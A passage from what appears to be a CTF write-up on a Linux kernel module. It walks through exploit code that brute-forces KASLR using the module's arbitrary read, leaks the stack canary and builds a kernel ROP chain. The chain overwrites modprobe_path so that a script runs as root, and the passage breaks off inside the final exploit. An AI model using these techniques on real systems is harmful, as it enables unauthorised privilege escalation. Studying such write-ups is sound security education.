</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>device_ioctl</span><span class=p>(</span><span class=n>file</span> <span class=o>*</span><span class=n>filp</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>request</span> <span class=n>req</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>canary</span> <span class=o>=</span> <span class=nf>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>!=</span> <span class=mh>0x1337</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>  <span class=nf>copy_from_user</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>req</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=mi>264LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>copy_to_user</span><span class=p>(</span><span class=n>arg</span> <span class=o>+</span> <span class=mi>8</span><span class=p>,</span> <span class=n>req</span><span class=p>.</span><span class=n>ptr</span><span class=p>,</span> <span class=mi>256LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><code>device_ioctl</code> function is also pretty straightforward.</p><p>Primarily, the function copies a <code>request</code> struct from userspace into the kernel.</p><p>It then copies back any arbitrary space requested by the struct in userspace and copies it back to userspace.</p><p>Essentially, this function gives us a <strong>free arbitrary read</strong>, allowing us to read anywhere we want in the kernel memory.</p><h2 id=fighting-kaslr>Fighting KASLR</h2><p>So far, we have found two very powerful vulnerabilities inside of the kernel module.</p><ol><li>Buffer Overflow</li><li>Arbitrary Read</li></ol><p>With the buffer overflow, we can possibly write a kernel ROP chain to elevate us to <strong>root</strong>. However, in order to do so, we need to find a way to bypass KASLR so that we are able to find gadgets to use in our ROP chain.</p><p>Our arbitrary read requires us to provide an address, however, if we do not know any kernel address in the first place, how can we use the arbitrary read to defeat KASLR?</p><p><strong>Answer: We can use the arbitrary read to brute force KASLR</strong></p><p>In order to understand how and why it works, we need to first understand the following three concepts:</p><p><em>copy_to_user is fail-safe</em></p><blockquote><p>copy_to_user does not fail even if the kernel address provided is not mapped yet, it simply copies a bunch of null bytes to the userspace buffer.</p><p>It only throws an error and fails when a kernel address is not physically mappable or does not have the appropriate permissions, which is not of concern to us in this writeup.</p></blockquote><p><a href=https://github.com/torvalds/linux/blob/12ad143e1b803e541e48b8ba40f550250259ecdd/arch/x86/boot/compressed/kaslr.c#L836><em>kaslr is brute-forceable</em></a></p><blockquote><p>Unlike in userspace where the ASLR entropy can be as high as 30 bits (1073741824 combinations), the KASLR entropy is only 9 bits (512 combinations) due to space constraints and alignment issues.</p></blockquote><p><a href=https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/7.4_release_notes/technology_previews_kernel#doc-wrapper><em>we know the range of kaslr addresses to brute force</em></a></p><blockquote><p>The physical address and virtual address of kernel text itself are randomized to a different position separately. The physical address of the kernel can be anywhere under 64TB, while the virtual address of the kernel is restricted between [0xffffffff80000000, 0xffffffffc0000000], the 1GB space.</p></blockquote><p>By combining both of these concepts, we can abuse the arbitrary read via <code>copy_to_user</code> in <code>device_ioctl</code> to brute force the 9 bits of and find our kernel image base.</p><h2 id=getting-our-hands-dirty-defeating-kaslr>Getting our hands dirty: Defeating KASLR</h2><p>With all the information, we can write a simple script to brute force the KASLR to get our kernel base.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>perror</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>msg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// returns 8 bytes from and arbitrary kernel address
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>aar</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>leak</span><span class=p>[</span><span class=mi>264</span><span class=o>/</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=n>leak</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x1337</span><span class=p>,</span> <span class=n>leak</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>leak</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>kbase</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/window&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;error: unable to open /dev/window&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// we start from the smallest possible kaslr address
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>kbase</span> <span class=o>=</span> <span class=mh>0xffffffff80000000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>ret</span> <span class=o>=</span> <span class=nf>aar</span><span class=p>(</span><span class=n>kbase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[-] trying 0x%lx... got 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>kbase</span><span class=p>,</span> <span class=n>ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>ret</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=n>kbase</span> <span class=o>+=</span> <span class=mh>0x100000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*] kbase at 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>kbase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><img src=attachments/window-of-opportunity-1.jpg alt></p><p>Voila!</p><h2 id=fighting-stack-cookies>Fighting Stack Cookies</h2><p>Now that we have our kernel base, we can easily construct a ROP chain to do whatever we want.</p><p>However, we are unable to overflow the return address with our ROP chain without wrecking the kernel stack canary. In order to exploit the buffer overflow, we need to first find a way to leak our stack canary.</p><p>Based on previous decompiled code &mdash; <code>canary = __readgsqword(0x28u)</code> &mdash; we can see that the canary is being loaded from <code>gs:0x28</code>.</p><p>We can look at it in our debugger</p><p><img src=attachments/window-of-opportunity-2.jpg alt></p><p>However, by looking at the address of <code>gs_base</code>, we can see that it is not within the kernel image base. If we reboot the kernel a few times, we can also see that <code>gs_base</code> address is also randomized.</p><p>This means that we will have to find a way to either</p><ul><li>leak a canary from within the kernel image</li><li>leak a pointer relative to gs_base from within the kernel image</li></ul><blockquote><p>Problem: The kernel image is so huge, how do we find a canary/pointer that we want?</p><p>Insight: Since the canary and the pointer to gs_base is all determined at runtime, we want to look for places that store data and is also writeable/modifiable at runtime.</p><p>We can look for pointers in the .BSS segment which is a segment within the kernel image that stores global variables that are only initialized at runtime.</p></blockquote><p>By looking at the <a href=https://man7.org/linux/man-pages/man1/nm.1.html>man page for nm</a>, we can see the following</p><p><img src=attachments/window-of-opportunity-3.jpg alt></p><p>The <code>/proc/kallsyms</code> file stores all the symbols <em>(functions, variables, etc.)</em> and the corresponding addresses for the kernel. It also follows the same convention as <code>nm</code>. Thus we can easily search for BSS variables by using the following command</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>/ <span class=c1># grep &#34; b &#34; /proc/kallsyms | head</span>
</span></span><span class=line><span class=cl>ffffffff96d3e000 b dummy_mapping
</span></span><span class=line><span class=cl>ffffffff96d3f000 b level3_user_vsyscall
</span></span><span class=line><span class=cl>ffffffff96d40000 b idt_table
</span></span><span class=line><span class=cl>ffffffff96d41000 b espfix_pud_page
</span></span><span class=line><span class=cl>ffffffff96d42000 b bm_pte
</span></span><span class=line><span class=cl>ffffffff96d43000 b scratch.0
</span></span><span class=line><span class=cl>ffffffff96d44010 b initcall_calltime
</span></span><span class=line><span class=cl>ffffffff96d44018 b panic_param
</span></span><span class=line><span class=cl>ffffffff96d44020 b panic_later
</span></span><span class=line><span class=cl>ffffffff96d44028 b execute_command
</span></span></code></pre></div><p>By scanning the BSS in memory in GDB, we can soon find an address that is at a relative offset from <code>$gs_base</code>.</p><pre tabindex=0><code>pwndbg&gt; x/gx 0xffffffff96d44050
0xffffffff96d44050:     0xffff9e870fcdb8c0
pwndbg&gt; x/gx $gs_base
0xffff9e870f600000:     0x0000000000000000
pwndbg&gt; pi hex(0xffffffff96d44050-0xffffffff94600000)
&#39;0x2744050&#39;
</code></pre><p>As you can see, there is a pointer at a relative offset to <code>$gs_base</code> stored in an offset of <em>0x2744050</em> from our kernel base address.</p><p>Based on this finding, we can easily leak our stack canary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>canary</span> <span class=o>=</span> <span class=nf>aar</span><span class=p>(</span><span class=nf>aar</span><span class=p>(</span><span class=n>kbase</span><span class=o>+</span><span class=mh>0x2744050</span><span class=p>)</span><span class=o>-</span><span class=mh>0x6db898</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*] canary at 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>canary</span><span class=p>);</span>
</span></span></code></pre></div><p><img src=attachments/window-of-opportunity-4.jpg alt></p><h2 id=getting-our-hands-dirty-krop-to-root>Getting our hands dirty: KROP to root</h2><p>With our canary and kernel base in hand, we are 60% to completing our exploit.</p><p>In kernelspace exploitation challenges, there are usually a few ways to escalate your privileges, some of the more common ones are:</p><ul><li>overwrite modprobe_path/core_pattern</li><li>commit_creds(prepare_kernel_cred(0))</li><li>overwrite cred structure</li></ul><p>For our case, given that we have an buffer overflow with nothing to stop us, we can take the approach of overwriting <strong>modprobe_path</strong> by calling <code>copy_from_user</code>.</p><h3 id=what-modprobe-what-path>what modprobe what path?</h3><p>For the knowledge-hungry and curious minds, you can find more details about it <a href=https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md>here</a> and <a href=https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/>here</a></p><p>A short summary of how the technique works &mdash; when we execute a file of an unknown format, it will do a series of calls:</p><pre tabindex=0><code>1. do_execve()
2. do_execveat_common()
3. bprm_execve()
4. exec_binprm()
5. search_binary_handler()
6. request_module()
7. call_modprobe()
</code></pre><p>Ultimately, if the kernel is unable to identify the format of the binary, it will attempt to call <code>call_usermodehelper_exec</code> which will execute the <code>modprobe_path</code> string with root privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>char</span> <span class=n>modprobe_path</span><span class=p>[</span><span class=n>KMOD_PATH_LEN</span><span class=p>]</span> <span class=o>=</span> <span class=n>CONFIG_MODPROBE_PATH</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>call_modprobe</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>orig_module_name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>wait</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>subprocess_info</span> <span class=o>*</span><span class=n>info</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>static</span> <span class=kt>char</span> <span class=o>*</span><span class=n>envp</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;HOME=/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;TERM=linux&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;PATH=/sbin:/usr/sbin:/bin:/usr/bin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nb>NULL</span>
</span></span><span class=line><span class=cl>	<span class=p>};</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>module_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>**</span><span class=n>argv</span> <span class=o>=</span> <span class=nf>kmalloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>[</span><span class=mi>5</span><span class=p>]),</span> <span class=n>GFP_KERNEL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>module_name</span> <span class=o>=</span> <span class=nf>kstrdup</span><span class=p>(</span><span class=n>orig_module_name</span><span class=p>,</span> <span class=n>GFP_KERNEL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>module_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>goto</span> <span class=n>free_argv</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>modprobe_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;-q&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;--&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>module_name</span><span class=p>;</span>	<span class=cm>/* check free_modprobe_argv() */</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>info</span> <span class=o>=</span> <span class=nf>call_usermodehelper_setup</span><span class=p>(</span><span class=n>modprobe_path</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>,</span> <span class=n>GFP_KERNEL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>					 <span class=nb>NULL</span><span class=p>,</span> <span class=n>free_modprobe_argv</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>info</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>goto</span> <span class=n>free_module_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>ret</span> <span class=o>=</span> <span class=nf>call_usermodehelper_exec</span><span class=p>(</span><span class=n>info</span><span class=p>,</span> <span class=n>wait</span> <span class=o>|</span> <span class=n>UMH_KILLABLE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>kmod_dup_request_announce</span><span class=p>(</span><span class=n>orig_module_name</span><span class=p>,</span> <span class=n>ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>free_module_name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nf>kfree</span><span class=p>(</span><span class=n>module_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nl>free_argv</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nf>kfree</span><span class=p>(</span><span class=n>argv</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nl>out</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nf>kmod_dup_request_announce</span><span class=p>(</span><span class=n>orig_module_name</span><span class=p>,</span> <span class=o>-</span><span class=n>ENOMEM</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=o>-</span><span class=n>ENOMEM</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>By corrupting <code>modprobe_path</code> to point to any arbitrary script that we provide, we can execute any commands we want in root privileges.</p><p>Ultimately, what we can do is:</p><ol><li>create a file <code>/tmp/xpl.sh</code> with contents <code>#!/bin/sh\nchmod 777 /flag.txt</code></li><li>create a file <code>/tmp/broken</code> with contents <code>\xff\xff\xff\xff</code></li><li>set modprobe_path to <code>/tmp/xpl.sh</code></li><li>execute <code>/tmp/broken</code> which would trigger modprobe and set our flag file to be executable</li></ol><h3 id=crafting-krop-chain>Crafting kROP chain</h3><p>Most of the kROP chain is business as usual just like a userspace ROP chain.</p><p>We first extract the <code>vmlinux</code> binary from the <code>bzImage</code> using <a href=https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux>this script</a>.</p><p>We can then obtain the gadgets using <code>ROPgadget --binary vmlinux > gadgets.txt</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// gadgets
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define pop_rdi (kbase+0x1d675)
</span></span></span><span class=line><span class=cl><span class=cp>#define pop_rsi (kbase+0x6ff0c)
</span></span></span><span class=line><span class=cl><span class=cp>#define pop_rdx (kbase+0x7baf4a)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define swapgs_iret (kbase+0x1001126)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// symbols
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define copy_from_user (kbase+0x6e5d00)
</span></span></span><span class=line><span class=cl><span class=cp>#define modprobe_path (kbase+0x208c500)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>new_path</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;/tmp/xpl.sh</span><span class=se>\x00</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>payload</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nf>memset</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span><span class=o>*</span> <span class=n>krop</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>payload</span><span class=p>[</span><span class=mh>0x40</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// copy_from_user(modprobe_path, new_path:=&#34;/tmp/xpl.sh\x00&#34;, strlen(new_path)+1)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>pop_rdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>modprobe_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>pop_rsi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>new_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>pop_rdx</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>new_path</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>copy_from_user</span><span class=p>;</span>
</span></span></code></pre></div><p>The only difference is that in kernelspace, after we finish our chain, we must return to userspace gracefully. The kernel is very fragile and will crash easily if you do not return gracefully.</p><blockquote><p>In order to return to user-mode, swapgs must be called before iretq. The purpose of this instruction is to also swap the GS register between kernel-mode and user-mode.</p><p>Additionally, due to KPTI, we must swap back from the kernel page table to the user-space page table, otherwise we will meet a segmentation fault.</p></blockquote><p>Instead of reimplementing the wheel, we can simply use the <code>swapgs_restore_regs_and_return_to_usermode()</code> function to return to userspace gracefully.</p><p>Do note that we will also have to save and restore our userspace registers to return to user-mode gracefully.</p><p>The final payload is</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;string.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/ioctl.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;unistd.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;fcntl.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdlib.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdlib.h&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#define pop_rdi (kbase+0x1d675)</span>
</span></span><span class=line><span class=cl><span class=c1>#define pop_rsi (kbase+0x6ff0c)</span>
</span></span><span class=line><span class=cl><span class=c1>#define pop_rdx (kbase+0x7baf4a)</span>
</span></span><span class=line><span class=cl><span class=c1>#define swapgs_iret (kbase+0x1001126)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#define copy_from_user (kbase+0x6e5d00)</span>
</span></span><span class=line><span class=cl><span class=c1>#define modprobe_path (kbase+0x208c500)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>unsigned</span> <span class=n>long</span> <span class=n>user_cs</span><span class=p>,</span> <span class=n>user_ss</span><span class=p>,</span> <span class=n>user_rflags</span><span class=p>,</span> <span class=n>user_sp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>save_state</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>__asm__</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mov user_cs, cs;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mov user_ss, ss;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mov user_sp, rsp;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;pushf;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;pop user_rflags;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;.att_syntax;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;[*] Saved state&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>//</span> <span class=n>prepare</span> <span class=n>malicious</span> <span class=n>modprobe</span> <span class=n>path</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s2>&#34;echo -e &#39;#!/bin/sh</span><span class=se>\n</span><span class=s2>chmod 777 /flag.txt&#39; &gt; /tmp/xpl.sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s2>&#34;chmod +x /tmp/xpl.sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s2>&#34;echo -e &#39;</span><span class=se>\xff\xff\xff\xff</span><span class=s2>&#39; &gt; /tmp/pwn&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s2>&#34;chmod +x /tmp/pwn&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>//</span> <span class=n>call</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>xpl</span><span class=o>.</span><span class=n>sh</span> <span class=k>with</span> <span class=n>root</span> <span class=n>permissions</span> <span class=n>via</span> <span class=n>modprobe_path</span>
